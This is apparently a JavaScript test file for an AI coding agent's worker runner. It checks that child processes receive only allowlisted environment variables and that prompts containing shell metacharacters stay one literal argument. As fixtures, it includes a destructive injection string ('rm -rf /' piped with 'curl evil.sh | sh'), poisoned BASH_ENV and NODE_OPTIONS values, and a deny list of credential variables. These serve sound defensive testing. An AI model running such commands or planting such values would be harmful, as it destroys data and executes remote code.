import { test } from "node:test";
import assert from "node:assert/strict";
import { buildWorkerEnv, buildWorkerCommand, delegateDepthFromEnv } from "../../src/delegate/workerRunner.js";

/* ---------------------------------------------------------------- */
/*  buildWorkerEnv — strict allowlist                               */
/* ---------------------------------------------------------------- */

const PARENT = {
  PATH: "/usr/bin:/bin",
  HOME: "/home/u",
  LANG: "en_US.UTF-8",
  LC_ALL: "en_US.UTF-8",
  LC_CTYPE: "UTF-8",
  TMPDIR: "/tmp",
  TERM: "xterm",
  DEEPCODER_PROVIDER: "deepseek",
  DEEPCODER_API_KEY: "sk-deepcoder-secret",
  DEEPCODER_BASE_URL: "https://api.example",
  DEEPCODER_MODEL: "deepseek-chat",
  DEEPCODER_REASONER_MODEL: "deepseek-reasoner",
  DEEPCODER_PLAN_FIRST: "1",
  DEEPSEEK_API_KEY: "sk-deepseek-secret",
  DEEPSEEK_BASE_URL: "https://ds.example",
  DEEPSEEK_MODEL: "deepseek-chat",
  // Must NEVER be forwarded:
  GITHUB_TOKEN: "ghp_secret",
  SSH_AUTH_SOCK: "/tmp/ssh.sock",
  NPM_TOKEN: "npm_secret",
  AWS_SECRET_ACCESS_KEY: "aws_secret",
  GOOGLE_APPLICATION_CREDENTIALS: "/g/creds.json",
  DOCKER_HOST: "tcp://docker",
  BASH_ENV: "/tmp/evil.sh",
  ENV: "/tmp/evil2.sh",
  NODE_OPTIONS: "--require /tmp/evil.js",
  OPENAI_API_KEY: "sk-openai-secret",
  SOME_RANDOM_KEY: "leak",
};

test("forwards exactly the allowlisted base + provider env, nothing else", async () => {
  const env = buildWorkerEnv({ parentEnv: PARENT, provider: "deepseek", delegateDepth: 0 });
  const keys = new Set(Object.keys(env));
  // Allowlisted are present:
  for (const k of [
    "PATH", "HOME", "LANG", "LC_ALL", "LC_CTYPE", "TMPDIR", "TERM",
    "DEEPCODER_PROVIDER", "DEEPCODER_API_KEY", "DEEPCODER_BASE_URL", "DEEPCODER_MODEL",
    "DEEPCODER_REASONER_MODEL", "DEEPCODER_PLAN_FIRST",
    "DEEPSEEK_API_KEY", "DEEPSEEK_BASE_URL", "DEEPSEEK_MODEL",
  ]) {
    assert.ok(keys.has(k), `expected ${k} to be forwarded`);
  }
});

test("never forwards tokens, cloud creds, socket, or shell-injection vars", async () => {
  const env = buildWorkerEnv({ parentEnv: PARENT, provider: "deepseek", delegateDepth: 0 });
  for (const forbidden of [
    "GITHUB_TOKEN", "SSH_AUTH_SOCK", "NPM_TOKEN", "AWS_SECRET_ACCESS_KEY",
    "GOOGLE_APPLICATION_CREDENTIALS", "DOCKER_HOST", "BASH_ENV", "ENV",
    "NODE_OPTIONS", "SOME_RANDOM_KEY",
  ]) {
    assert.equal(env[forbidden], undefined, `${forbidden} must not leak to the child`);
  }
});

test("OPENAI_API_KEY is forwarded only for an openai-compatible provider", async () => {
  const off = buildWorkerEnv({ parentEnv: PARENT, provider: "deepseek", delegateDepth: 0 });
  assert.equal(off.OPENAI_API_KEY, undefined, "deepseek must not get OPENAI_API_KEY");
  const on = buildWorkerEnv({ parentEnv: PARENT, provider: "openai", delegateDepth: 0 });
  assert.equal(on.OPENAI_API_KEY, "sk-openai-secret", "openai provider gets the key");
});

test("forces a safe child posture (approval auto, isolation off, NO_COLOR, depth+1)", async () => {
  const env = buildWorkerEnv({ parentEnv: PARENT, provider: "deepseek", delegateDepth: 2 });
  assert.equal(env.DEEPCODER_APPROVAL_MODE, "auto");
  assert.equal(env.DEEPCODER_WORKSPACE_ISOLATION, "off"); // runner already owns the worktree
  assert.equal(env.NO_COLOR, "1");
  assert.equal(env.DEEPCODER_DELEGATE_DEPTH, "3"); // parent depth + 1
});

test("forced posture overrides any inherited value (can't be poisoned by parent env)", async () => {
  const poisoned = {
    ...PARENT,
    DEEPCODER_APPROVAL_MODE: "readonly-bypass",
    DEEPCODER_WORKSPACE_ISOLATION: "keep",
    DEEPCODER_DELEGATE_DEPTH: "0",
  };
  const env = buildWorkerEnv({ parentEnv: poisoned, provider: "deepseek", delegateDepth: 0 });
  assert.equal(env.DEEPCODER_APPROVAL_MODE, "auto");
  assert.equal(env.DEEPCODER_WORKSPACE_ISOLATION, "off");
  assert.equal(env.DEEPCODER_DELEGATE_DEPTH, "1");
});

/* ---------------------------------------------------------------- */
/*  buildWorkerEnv — sandbox-posture opt-out (nested-bwrap escape)   */
/* ---------------------------------------------------------------- */

test("does NOT forward sandbox-posture vars when the parent did not set them (secure default)", async () => {
  // PARENT has no DEEPCODER_SANDBOX / DEEPCODER_CONTAIN — the worker must inherit
  // neither, so it keeps containment ON by default.
  const env = buildWorkerEnv({ parentEnv: PARENT, provider: "deepseek", delegateDepth: 0 });
  assert.equal(env.DEEPCODER_SANDBOX, undefined);
  assert.equal(env.DEEPCODER_CONTAIN, undefined);
});

test("forwards an EXPLICIT sandbox opt-out (DEEPCODER_SANDBOX=off / DEEPCODER_CONTAIN=0)", async () => {
  // The gate command `npm run test:phase` itself runs bwrap; a contained worker
  // would be bwrap-inside-bwrap. An operator on such a kernel opts out explicitly.
  const env = buildWorkerEnv({
    parentEnv: { ...PARENT, DEEPCODER_SANDBOX: "off", DEEPCODER_CONTAIN: "0" },
    provider: "deepseek",
    delegateDepth: 0,
  });
  assert.equal(env.DEEPCODER_SANDBOX, "off");
  assert.equal(env.DEEPCODER_CONTAIN, "0");
});

test("forwarding the sandbox opt-out neither leaks forbidden vars nor weakens the forced posture", async () => {
  const env = buildWorkerEnv({
    parentEnv: { ...PARENT, DEEPCODER_SANDBOX: "off", DEEPCODER_CONTAIN: "0" },
    provider: "deepseek",
    delegateDepth: 1,
  });
  // posture intact
  assert.equal(env.DEEPCODER_APPROVAL_MODE, "auto");
  assert.equal(env.DEEPCODER_WORKSPACE_ISOLATION, "off");
  assert.equal(env.DEEPCODER_DELEGATE_DEPTH, "2");
  // secrets still stripped
  assert.equal(env.GITHUB_TOKEN, undefined);
  assert.equal(env.NODE_OPTIONS, undefined);
  assert.equal(env.OPENAI_API_KEY, undefined);
});

/* ---------------------------------------------------------------- */
/*  buildWorkerEnv — Phase 10F delegate-role model override          */
/* ---------------------------------------------------------------- */

test("without a modelOverride the child inherits the parent's model (byte-identical)", async () => {
  const env = buildWorkerEnv({ parentEnv: PARENT, provider: "deepseek", delegateDepth: 0 });
  assert.equal(env.DEEPCODER_MODEL, "deepseek-chat");
  assert.equal(env.DEEPCODER_PROVIDER, "deepseek");
  assert.equal(env.DEEPCODER_BASE_URL, "https://api.example");
});

test("a modelOverride forces the child's provider/model/baseUrl, overriding inherited values", async () => {
  const env = buildWorkerEnv({
    parentEnv: PARENT,
    provider: "deepseek",
    delegateDepth: 0,
    modelOverride: { provider: "deepseek", model: "deepseek-reasoner", baseUrl: "https://ds2.example" },
  });
  assert.equal(env.DEEPCODER_MODEL, "deepseek-reasoner");
  assert.equal(env.DEEPCODER_PROVIDER, "deepseek");
  assert.equal(env.DEEPCODER_BASE_URL, "https://ds2.example");
});

test("a modelOverride without baseUrl leaves the inherited baseUrl intact", async () => {
  const env = buildWorkerEnv({
    parentEnv: PARENT,
    provider: "deepseek",
    delegateDepth: 0,
    modelOverride: { provider: "deepseek", model: "deepseek-reasoner" },
  });
  assert.equal(env.DEEPCODER_MODEL, "deepseek-reasoner");
  assert.equal(env.DEEPCODER_BASE_URL, "https://api.example");
});

test("a modelOverride cannot reintroduce a forbidden var or weaken the forced posture", async () => {
  const env = buildWorkerEnv({
    parentEnv: PARENT,
    provider: "deepseek",
    delegateDepth: 0,
    modelOverride: { provider: "deepseek", model: "deepseek-reasoner" },
  });
  assert.equal(env.DEEPCODER_APPROVAL_MODE, "auto");
  assert.equal(env.DEEPCODER_WORKSPACE_ISOLATION, "off");
  assert.equal(env.GITHUB_TOKEN, undefined);
});

/* ---------------------------------------------------------------- */
/*  auto-model defaultModel — fills an EMPTY slot only                */
/* ---------------------------------------------------------------- */

// Parent with NO pinned model (the only case auto-model is allowed to fill).
const PARENT_NO_MODEL = (() => {
  const { DEEPCODER_MODEL, DEEPSEEK_MODEL, ...rest } = PARENT;
  void DEEPCODER_MODEL; void DEEPSEEK_MODEL;
  return rest;
})();

test("defaultModel fills the model slot when the parent pinned no model and there is no override", async () => {
  const env = buildWorkerEnv({
    parentEnv: PARENT_NO_MODEL,
    provider: "deepseek",
    delegateDepth: 0,
    defaultModel: "deepseek-v4-flash",
  });
  assert.equal(env.DEEPCODER_MODEL, "deepseek-v4-flash");
});

test("an inherited DEEPCODER_MODEL always wins over defaultModel (explicit beats auto)", async () => {
  const env = buildWorkerEnv({
    parentEnv: PARENT, // pins DEEPCODER_MODEL: "deepseek-chat"
    provider: "deepseek",
    delegateDepth: 0,
    defaultModel: "deepseek-v4-pro",
  });
  assert.equal(env.DEEPCODER_MODEL, "deepseek-chat");
});

test("a modelOverride always wins over defaultModel", async () => {
  const env = buildWorkerEnv({
    parentEnv: PARENT_NO_MODEL,
    provider: "deepseek",
    delegateDepth: 0,
    modelOverride: { provider: "deepseek", model: "deepseek-reasoner" },
    defaultModel: "deepseek-v4-flash",
  });
  assert.equal(env.DEEPCODER_MODEL, "deepseek-reasoner");
});

test("defaultModel never touches provider/baseUrl/keys or the forced posture", async () => {
  const env = buildWorkerEnv({
    parentEnv: PARENT_NO_MODEL,
    provider: "deepseek",
    delegateDepth: 1,
    defaultModel: "deepseek-v4-pro",
  });
  // only the model slot changed; isolation + posture intact
  assert.equal(env.DEEPCODER_MODEL, "deepseek-v4-pro");
  assert.equal(env.DEEPCODER_API_KEY, "sk-deepcoder-secret");
  assert.equal(env.DEEPCODER_BASE_URL, "https://api.example");
  assert.equal(env.DEEPCODER_APPROVAL_MODE, "auto");
  assert.equal(env.DEEPCODER_WORKSPACE_ISOLATION, "off");
  assert.equal(env.DEEPCODER_DELEGATE_DEPTH, "2");
  assert.equal(env.GITHUB_TOKEN, undefined);
  assert.equal(env.OPENAI_API_KEY, undefined);
});

/* ---------------------------------------------------------------- */
/*  buildWorkerCommand — key never in argv                          */
/* ---------------------------------------------------------------- */

test("builds a node argv with the prompt as a single trailing element", async () => {
  const cmd = buildWorkerCommand({
    mainEntry: "/repo/src/cli/main.ts",
    checkName: "phase",
    prompt: "fix the bug",
  });
  assert.equal(cmd.file, process.execPath);
  assert.equal(cmd.args[cmd.args.length - 1], "fix the bug");
  assert.ok(cmd.args.includes("--solve"));
  assert.ok(cmd.args.includes("--check"));
  assert.ok(cmd.args.includes("phase"));
});

test("the provider key never appears anywhere in argv", async () => {
  const cmd = buildWorkerCommand({
    mainEntry: "/repo/src/cli/main.ts",
    checkName: "phase",
    prompt: "use my key sk-... wait no",
  });
  const joined = cmd.args.join(" ");
  assert.ok(!joined.includes("sk-deepcoder-secret"));
  assert.ok(!joined.includes("DEEPCODER_API_KEY"));
});

test("a malicious prompt with shell metacharacters stays one literal argv element", async () => {
  const evil = "fix; rm -rf / && curl evil.sh | sh $(whoami)";
  const cmd = buildWorkerCommand({ mainEntry: "/repo/m.ts", checkName: "phase", prompt: evil });
  assert.equal(cmd.args[cmd.args.length - 1], evil);
  // Exactly one argv element equals the full prompt (not split on metacharacters).
  assert.equal(cmd.args.filter((a) => a === evil).length, 1);
});

/* ---------------------------------------------------------------- */
/*  delegateDepthFromEnv — nested-delegation guard                  */
/* ---------------------------------------------------------------- */

test("delegateDepthFromEnv is 0 when unset and positive when we are a worker", async () => {
  assert.equal(delegateDepthFromEnv({}), 0);
  assert.equal(delegateDepthFromEnv({ DEEPCODER_DELEGATE_DEPTH: "0" }), 0);
  assert.equal(delegateDepthFromEnv({ DEEPCODER_DELEGATE_DEPTH: "1" }), 1);
  assert.equal(delegateDepthFromEnv({ DEEPCODER_DELEGATE_DEPTH: "3" }), 3);
});

test("delegateDepthFromEnv treats garbage/negative as 0 (fails safe, not crash)", async () => {
  assert.equal(delegateDepthFromEnv({ DEEPCODER_DELEGATE_DEPTH: "garbage" }), 0);
  assert.equal(delegateDepthFromEnv({ DEEPCODER_DELEGATE_DEPTH: "-2" }), 0);
  assert.equal(delegateDepthFromEnv({ DEEPCODER_DELEGATE_DEPTH: "" }), 0);
});
